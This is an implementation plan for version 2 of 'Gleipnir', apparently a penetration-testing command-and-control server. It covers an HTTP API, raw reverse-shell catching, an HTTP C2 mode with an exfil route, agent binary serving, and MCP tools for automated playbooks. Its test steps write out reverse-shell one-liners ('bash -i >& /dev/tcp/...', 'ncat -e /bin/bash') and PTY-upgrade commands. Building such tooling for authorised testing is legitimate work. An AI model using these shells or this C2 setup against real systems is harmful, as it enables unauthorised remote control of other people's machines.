# Gleipnir v2 Implementation Plan

Based on `packages/gleipnir/SPEC.md`. Phases 1-4 (GUI and deprecation are future).

## Current state

- ~3500 lines of Rust across relay (1604) and agent (1531)
- Unix socket JSON-lines API (api.rs, 230 lines)
- Single listener mode (PKRL native agent protocol)
- SessionManager with exec/upload/download/socks
- TLS support (optional feature, self-signed cert generation)
- Solid test coverage (integration.rs + 4 shell E2E scripts)
- MCP tools in tooling-mcp wrap the Unix socket API
- Docker container serves pre-compiled agent binaries

## Dependency graph

```
Protocol auto-detect (raw.rs)
    │
    ├── Raw session wrapper
    │       │
    │       └── Multi-mode listener manager
    │               │
    │               ├── HTTP API (axum, replaces Unix socket)
    │               │       │
    │               │       ├── CLI client (gleipnir-cli)
    │               │       ├── MCP tools (switch to HTTP)
    │               │       └── WebSocket (events + attach)
    │               │
    │               └── HTTP C2 listener mode
    │
    └── Agent binary serving
```

---

## Task 1: Add axum HTTP API alongside Unix socket

**Description:** Add an HTTP API using axum that exposes the same operations as the current Unix socket API. Both APIs run concurrently; nothing is removed. This is the foundation every client depends on.

**Acceptance criteria:**
- [ ] `axum` added to relay dependencies
- [ ] HTTP server starts on `--api-port` (default 6666) alongside the existing Unix socket
- [ ] Routes: `GET /api/health`, `GET /api/info`, `GET /api/sessions`, `GET /api/sessions/:name`, `POST /api/sessions/:name/exec`, `POST /api/sessions/:name/upload`, `POST /api/sessions/:name/download`, `DELETE /api/sessions/:name`, `POST /api/tunnels`, `GET /api/tunnels`, `DELETE /api/tunnels/:session`
- [ ] Request/response types match the spec (JSON, same fields as Unix socket API)
- [ ] SessionManager and SocksRelay passed as axum State
- [ ] Integration test: start relay, connect agent, exec via HTTP API

**Verification:**
- [ ] `cargo test` passes (existing + new)
- [ ] `curl http://localhost:6666/api/sessions` returns session list
- [ ] `curl -X POST http://localhost:6666/api/sessions/test/exec -d '{"command":"id"}' returns output

**Dependencies:** None

**Files:**
- `relay/Cargo.toml` (add axum, tower-http)
- `relay/src/http_api.rs` (new, ~250 lines)
- `relay/src/main.rs` (add --api-port, spawn HTTP server)
- `relay/tests/integration.rs` (add HTTP API tests)

**Scope:** M

---

## Task 2: Listener management API

**Description:** Replace the single hardcoded listener with a `ListenerManager` that can create, list, and close listeners dynamically via the HTTP API. Each listener has a mode (agent/raw/http), port, and auto-generated ID.

**Acceptance criteria:**
- [ ] `ListenerManager` struct with `create(port, mode, bind, name_prefix)`, `list()`, `close(id)` methods
- [ ] Routes: `POST /api/listeners`, `GET /api/listeners`, `GET /api/listeners/:id`, `DELETE /api/listeners/:id`
- [ ] The relay's startup `--port` creates a default listener (mode=agent)
- [ ] Multiple listeners can run on different ports simultaneously
- [ ] Listeners tracked with ID, port, mode, creation time, connection count

**Verification:**
- [ ] Create a second listener via API while default is running
- [ ] Both accept connections independently
- [ ] Close listener via API, port is freed

**Dependencies:** Task 1

**Files:**
- `relay/src/listener.rs` (refactor into ListenerManager)
- `relay/src/http_api.rs` (add listener routes)
- `relay/src/main.rs` (use ListenerManager)

**Scope:** M

---

## Task 3: Raw TCP session wrapper

**Description:** When a non-PKRL connection arrives, wrap it as a "raw session" that supports exec via stdin/stdout marker-based command execution. This is the core feature that lets gleipnir catch bash reverse shells.

**Acceptance criteria:**
- [ ] `session_raw.rs` module with `RawSession` that wraps a `TcpStream`
- [ ] Auto-detection: first 4 bytes checked for PKRL magic; if not, treat as raw
- [ ] Shell detection: send `id\n` on connect, parse output for uid/hostname
- [ ] PTY upgrade attempt: try `python3 -c "import pty;pty.spawn('/bin/bash')"` then `script -qc /bin/bash /dev/null`
- [ ] Exec via marker: write `command; echo __GLEIPNIR_DONE_<random>__\n`, read until marker
- [ ] Raw sessions appear in `GET /api/sessions` with `mode: "raw"` and detected metadata
- [ ] Integration test: start relay, `bash -i >& /dev/tcp/127.0.0.1/PORT 0>&1`, exec command via API

**Verification:**
- [ ] `cargo test` passes
- [ ] Manual test: `ncat -e /bin/bash 127.0.0.1 4444` creates a session, `exec "id"` returns uid
- [ ] PTY upgrade detected and applied when python3 available

**Dependencies:** Task 2 (needs ListenerManager for mode routing)

**Files:**
- `relay/src/session_raw.rs` (new, ~200 lines)
- `relay/src/session.rs` (add `handle_raw_connection`, extend SessionInfo with `mode` field)
- `relay/src/listener.rs` (auto-detect protocol on accept)
- `relay/tests/integration.rs` (raw session test)

**Scope:** M

---

## Checkpoint: After Tasks 1-3

- [ ] HTTP API works alongside Unix socket
- [ ] Multiple listeners can run on different ports
- [ ] Raw TCP shells caught and exec works via API
- [ ] All existing tests pass (no regressions)
- [ ] Manual test: bash revshell -> session -> exec via curl
- [ ] **Review with human before proceeding**

---

## Task 4: WebSocket support (events + attach)

**Description:** Add WebSocket endpoints for real-time session events and interactive terminal attach. Events let clients react to new sessions without polling; attach enables live terminal interaction.

**Acceptance criteria:**
- [ ] `WS /ws/events` - server-sent events: `session.new`, `session.closed`, `listener.connection`
- [ ] `WS /ws/sessions/:name` - bidirectional byte stream for interactive terminal attach
- [ ] Events broadcast to all connected WebSocket clients
- [ ] Attach works for both native and raw sessions
- [ ] SessionManager gains an event broadcast channel (`tokio::sync::broadcast`)

**Verification:**
- [ ] `websocat ws://localhost:6666/ws/events` shows events when sessions connect/disconnect
- [ ] `websocat -b ws://localhost:6666/ws/sessions/test` provides interactive shell

**Dependencies:** Task 3

**Files:**
- `relay/Cargo.toml` (add tokio-tungstenite or axum built-in WS)
- `relay/src/ws.rs` (new, ~150 lines)
- `relay/src/http_api.rs` (mount WS routes)
- `relay/src/session.rs` (add broadcast channel for events)

**Scope:** M

---

## Task 5: CLI client (`gleipnir-cli`)

**Description:** New Rust crate in the workspace that talks to the HTTP API. Provides human-friendly session management, one-shot exec, and interactive attach.

**Acceptance criteria:**
- [ ] `cli/` crate added to workspace
- [ ] `gleipnir --server URL sessions` lists sessions
- [ ] `gleipnir exec <session> "id"` executes and prints output
- [ ] `gleipnir attach <session>` opens interactive terminal via WebSocket (crossterm raw mode)
- [ ] `gleipnir listen PORT [--mode raw]` creates a listener
- [ ] `gleipnir listeners` lists active listeners
- [ ] `gleipnir catch PORT` - embedded mode: starts a server, opens a listener, catches first connection, drops into interactive attach
- [ ] `--server` defaults to `http://localhost:6666`

**Verification:**
- [ ] `gleipnir sessions` shows output matching `curl /api/sessions`
- [ ] `gleipnir catch 9001` in one terminal, `bash revshell` in another, interactive shell works
- [ ] `gleipnir exec <session> "whoami"` prints username

**Dependencies:** Task 4 (needs WebSocket for attach)

**Files:**
- `cli/Cargo.toml` (new: clap, reqwest, crossterm, tokio-tungstenite)
- `cli/src/main.rs` (clap CLI)
- `cli/src/client.rs` (HTTP API client)
- `cli/src/interactive.rs` (terminal attach via WS)
- `cli/src/catch.rs` (embedded server mode)
- `Cargo.toml` (add cli to workspace members)

**Scope:** L (split across files but each is small)

---

## Task 6: HTTP C2 listener mode

**Description:** Add an HTTP-based C2 listener for poll-based command execution. Targets check in via HTTP POST, poll for tasks, and submit results. Useful for environments where raw TCP shells aren't possible.

**Acceptance criteria:**
- [ ] `session_http.rs` module with HTTP C2 session logic
- [ ] Routes: `POST /c2/:session/checkin`, `GET /c2/:session/task`, `POST /c2/:session/result`, `POST /c2/:session/exfil`
- [ ] Sessions appear in the session pool with `mode: "http"`
- [ ] Exec queues a command; target picks it up on next poll; result delivered via oneshot
- [ ] Configurable poll timeout (session dies if no checkin within timeout)
- [ ] CLI and MCP can `exec` on HTTP sessions the same as native/raw

**Verification:**
- [ ] Create http listener, `curl -X POST /c2/test/checkin`, session appears
- [ ] Queue exec via API, `curl /c2/test/task` returns command, `curl -X POST /c2/test/result` delivers output
- [ ] Session times out if no checkin within configured interval

**Dependencies:** Task 2 (listener manager)

**Files:**
- `relay/src/session_http.rs` (new, ~200 lines)
- `relay/src/http_api.rs` (mount /c2 routes)
- `relay/src/listener.rs` (http mode creates HTTP listener)

**Scope:** M

---

## Task 7: Agent binary serving

**Description:** Serve pre-compiled agent binaries via the HTTP API. Allows targets to download the agent with a simple curl command.

**Acceptance criteria:**
- [ ] `GET /api/agents` lists available platform/arch combinations
- [ ] `GET /api/agents/:platform/:arch` serves the binary file
- [ ] Agent directory configurable via `--agent-dir` (default `/opt/gleipnir/agents/`)
- [ ] Dockerfile already downloads agents to `/opt/gleipnir/agents/`; this just serves them
- [ ] CLI: `gleipnir serve-agent` shows the download URL

**Verification:**
- [ ] `curl http://localhost:6666/api/agents` returns list
- [ ] `curl http://localhost:6666/api/agents/linux/amd64 -o agent && chmod +x agent && file agent` shows ELF binary

**Dependencies:** Task 1

**Files:**
- `relay/src/agent_server.rs` (new, ~60 lines)
- `relay/src/http_api.rs` (mount agent routes)
- `relay/src/main.rs` (add --agent-dir arg)

**Scope:** S

---

## Checkpoint: After Tasks 4-7

- [ ] Full HTTP API + WebSocket events + attach
- [ ] CLI works: sessions, exec, attach, catch, listeners
- [ ] Raw TCP, native agent, and HTTP C2 all create sessions in the same pool
- [ ] Agent binaries served via HTTP
- [ ] All tests pass
- [ ] **Review with human before proceeding**

---

## Task 8: MCP tools switch to HTTP API

**Description:** Update `packages/tooling-mcp` gleipnir tools to use the HTTP API instead of the Unix socket. Add `gleipnir_listen` tool. Backward compatible: falls back to Unix socket if HTTP not available.

**Acceptance criteria:**
- [ ] All existing MCP tools (`gleipnir_exec`, `gleipnir_sessions`, `gleipnir_upload`, `gleipnir_download`, `gleipnir_tunnel`) use HTTP API
- [ ] New `gleipnir_listen` tool: create a listener (mode, port)
- [ ] New `gleipnir_kill` tool: kill a session
- [ ] Server URL from env: `PK_GLEIPNIR_URL` (default `http://localhost:6666`)
- [ ] Fallback to Unix socket if HTTP fails (for backward compat during migration)

**Verification:**
- [ ] MCP tools work against HTTP API
- [ ] `gleipnir_listen` creates a listener visible in `gleipnir_sessions`
- [ ] Existing PK engagement workflow still works

**Dependencies:** Task 1

**Files:**
- `packages/tooling-mcp/src/index.ts` (refactor gleipnir section)

**Scope:** S

---

## Task 9: PK Action SDK `ctx.callback()`

**Description:** Add `callback()` method to the playbook action RunContext that requests a listener from gleipnir and returns connection info. The supervisor watches for new sessions via WebSocket events and emits `ShellObtained`.

**Acceptance criteria:**
- [ ] `ctx.callback({ mode: "raw" })` returns `{ ip, port, mode, oneliner }`
- [ ] Internally: `POST /api/listeners` to allocate port, detect tun0 IP
- [ ] `oneliner` generated per mode: bash revshell (raw), curl download+exec (agent), curl checkin (http)
- [ ] Supervisor connects to `WS /ws/events` and emits `ShellObtained` event when `session.new` arrives
- [ ] `ShellObtained` event payload includes session name, target IP, user, mode

**Verification:**
- [ ] Unit test: `ctx.callback()` returns valid connection info
- [ ] Integration: supervisor sees session.new event, emits ShellObtained
- [ ] Playbook action can use the callback info to trigger a reverse shell

**Dependencies:** Task 4 (WebSocket events), Task 8 (MCP tools on HTTP)

**Files:**
- `packages/core/src/sdk.ts` (add callback to RunContext)
- `packages/supervisor/src/index.ts` (WebSocket event bridge)
- `packages/supervisor/src/api-client.ts` (gleipnir HTTP client)

**Scope:** M

---

## Task 10: Docker compose + deployment wiring

**Description:** Update docker-compose, Dockerfile, and `pk vpn up` to support the new architecture. Server container exposes both the agent listener port and the HTTP API port. VPN port forwarding automated.

**Acceptance criteria:**
- [ ] Dockerfile builds `gleipnir-server` (renamed from `gleipnir-relay`) and `gleipnir-cli`
- [ ] `gleipnir-cli` available in the container for manual use
- [ ] Docker compose exposes API port (6666) alongside agent port (4444)
- [ ] `pk vpn up` on macOS/Colima sets up socat forwarding from VM tun0 to gleipnir container for both ports
- [ ] `gleipnir-vpn` service variant shares VPN sidecar network (unchanged pattern)
- [ ] Health check uses HTTP API: `curl http://localhost:6666/api/health`

**Verification:**
- [ ] `docker compose up gleipnir` starts and serves API
- [ ] `curl http://localhost:6666/api/health` from host returns OK
- [ ] Agent connects from outside Docker via mapped port
- [ ] On Colima: `pk vpn up` enables target callbacks to reach gleipnir

**Dependencies:** Task 1, Task 7

**Files:**
- `packages/gleipnir/Dockerfile` (build server + cli, rename binary)
- `docker-compose.yml` (add API port, health check)
- `packages/cli/src/index.ts` (update `pk vpn up` to forward gleipnir API port)

**Scope:** M

---

## Checkpoint: After Tasks 8-10

- [ ] MCP tools work via HTTP API
- [ ] `ctx.callback()` works in playbook actions
- [ ] Docker deployment serves both agent listener and HTTP API
- [ ] VPN port forwarding automated for macOS/Colima
- [ ] Full round-trip: playbook action -> ctx.callback -> target shell -> gleipnir session -> next action exec
- [ ] **Review with human before proceeding**

---

## Task 11: Rename relay -> server, update all references

**Description:** Rename the `relay/` crate to `server/`, update binary name from `gleipnir-relay` to `gleipnir-server`, update all references in Dockerfile, compose, tests, docs.

**Acceptance criteria:**
- [ ] `relay/` directory renamed to `server/`
- [ ] `Cargo.toml` package name: `gleipnir-server`
- [ ] Binary name: `gleipnir-server`
- [ ] Dockerfile, compose, test scripts updated
- [ ] CHANGELOG entry

**Verification:**
- [ ] `cargo build` produces `gleipnir-server` binary
- [ ] All tests pass
- [ ] Docker build succeeds

**Dependencies:** Task 10 (do after Docker wiring to avoid conflicts)

**Files:**
- `relay/` -> `server/` (rename)
- `Cargo.toml` (update workspace member)
- `Dockerfile`, `docker-compose.yml`, test scripts

**Scope:** S

---

## Task 12: E2E Docker test

**Description:** A single docker-compose test that validates the full stack: server + raw listener + target container sending a bash revshell + CLI exec + API verification.

**Acceptance criteria:**
- [ ] `tests/docker-e2e-v2.sh` script
- [ ] Starts gleipnir-server in a container
- [ ] Creates a raw listener via CLI
- [ ] Starts a "target" container that sends `bash -i >& /dev/tcp/gleipnir/9001 0>&1`
- [ ] Verifies session appears via API
- [ ] Executes `id` on the session via CLI
- [ ] Tests agent binary serving
- [ ] Tests HTTP C2 listener (curl-based checkin/poll/result)
- [ ] Cleans up

**Verification:**
- [ ] `./tests/docker-e2e-v2.sh` passes end-to-end
- [ ] Test runs in CI without manual intervention

**Dependencies:** Task 11

**Files:**
- `tests/docker-e2e-v2.sh` (new)
- `tests/docker-compose.test.yml` (new, test services)

**Scope:** M

---

## Final Checkpoint

- [ ] All phases 1-4 from the spec implemented
- [ ] Server: HTTP API, WebSocket, multi-mode listeners (agent/raw/http), session pool
- [ ] Agent: unchanged (backward compatible)
- [ ] CLI: sessions, exec, attach, listen, catch
- [ ] MCP: all tools on HTTP API
- [ ] PK SDK: ctx.callback() with supervisor ShellObtained events
- [ ] Docker: server + CLI in container, API port exposed, VPN forwarding automated
- [ ] Tests: unit + integration + Docker E2E
- [ ] Documentation: SPEC.md up to date, CHANGELOG entries
